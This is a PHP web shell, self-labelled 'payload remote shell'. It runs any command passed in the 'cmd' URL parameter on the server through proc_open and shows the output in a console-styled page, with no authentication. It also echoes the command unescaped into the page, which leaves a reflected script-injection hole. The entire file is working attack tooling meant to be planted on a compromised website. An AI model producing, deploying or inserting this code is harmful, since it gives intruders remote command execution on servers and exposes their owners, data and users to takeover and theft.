<?php
//payload remote shell
?>
<link rel="preconnect" href="https://fonts.gstatic.com">

<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300&display=swap" rel="stylesheet"> 
<style>
.container {
	background-color: black;
	width:auto;
	height: auto;
	font-family: 'Ubuntu', sans-serif;
	color: #FFFFFF;}

.newcmd {
	display: flex;
	align-items: center;}

.us {
	color: #FFFFFF;
	font-family: 'Ubuntu', sans-serif;
	font-weight: bold;}

.cmd {
	width: 45em;
	color: #FFFFFF;
	background-color: black;
	border: none;
	padding-left: 5px;
	}
	
.dis {
	padding: 10px;}
	
.answer {
	color: #FFFFFF;
	}

xmp {
	width: 40em;
	overflow-wrap: anywhere;
	overflow:auto;}
	
.f {
	margin: 0;}
</style>
<div class="container">
	<?php if (isset($_GET['cmd'])) { ?>
	<div class="dis">
		<div class="newcmd">
			<div class="us">
			$Console > 
			</div>
			<input class="cmd" type="text" value="<?php echo $_GET['cmd']; ?>" disabled="disabled">
		</div>
		=>
		<div class="answer" id="cont">
			<?php  $cmd=$_GET['cmd'];
 $gs="\n"; // this is the delimiter of each line. use "\r\n" in case of windows ...
 $pipesDescr=array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("file", "/tmp/error.log", "a"), );
 $p=proc_open($cmd, $pipesDescr, $pipes);
 if ($p)
 {
  stream_set_blocking($pipes[0],0);
  stream_set_blocking($pipes[1],0);
  $work=true; $buffer=''; $mode='idle'; $command=''; $idle=0;
  while ($work)
  {
   if ($mode=='idle')
   {
    if ($command<>'')
    {
     fwrite($pipes[0],$command."\n");
     $command='';
     $idle=0;
     $speed=500; // microseconds!
    }
    else
    {
     $speed=100000; // microseconds !
    }
   }
   $s=fread($pipes[1],1024);
   if ($s<>'')
   {
    $mode='action';
    $buffer.=$s;
    while (strstr($buffer,$gs))
    {
     $ex=explode($gs,$buffer,2);
     {
      $buffer=@$ex[1]; $line=@$ex[0];
      // here you can process the line with something ...
      print($line."<br/>\n");
      //
     }
    }
    $speed=500;
    $idle=0;
   }
   else
   {
    if (@$idle<1000)
    {
     $idle++; // did not idled for too long, let's still watch intensely for new data
    }
    else
    {
     $speed=100000; // it's been idle for a while, let's not overload the CPU for nothing ...
     $mode='idle';
    }
   }
   $status=proc_get_status($p);
   if (!$status["running"]) {$work=false;} // if the program has quited, we should do so as well ...
  } // end of $work loop
  proc_close($p);
 }?>
			
		</div>
	</div>
	<?php }; ?>
	<div class="dis">
		<div class="newcmd">
			<div class="us">
			$Console > 
			</div>
			<form action="" method="GET" class="f">
				<input class="cmd" value="" name="cmd" autofocus>
				HTML output ?<input type="checkbox" id="scales" name="html">
			</form>
		</div>
	</div>
</div>
<?php if (isset($_GET["html"]) && $_GET['html']=='on') { ?>
<script>
	s = document.getElementById("cont").innerHTML;
	s = s.replace(/<br>/g,"");
	s = s.replace(/</g, "&lt;");  
	s = s.replace(/>/g,"&gt;"); 
	document.getElementById("cont").innerHTML =s;
	
	
	
</script>
<?php }; ?>
